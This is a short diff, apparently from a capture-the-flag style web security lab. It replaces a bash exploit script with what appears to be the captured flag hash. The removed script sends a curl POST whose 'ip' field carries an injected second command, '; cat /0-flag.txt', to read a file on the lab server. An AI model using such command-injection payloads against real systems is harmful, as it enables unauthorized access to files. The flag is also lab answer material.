@@ -1,2 +1,1 @@
-#!/bin/bash
-curl -s -d "ip=$1; cat /0-flag.txt" http://web0x09.hbtn/app1/
+d307d34b702416ab88d9b373da34f44d
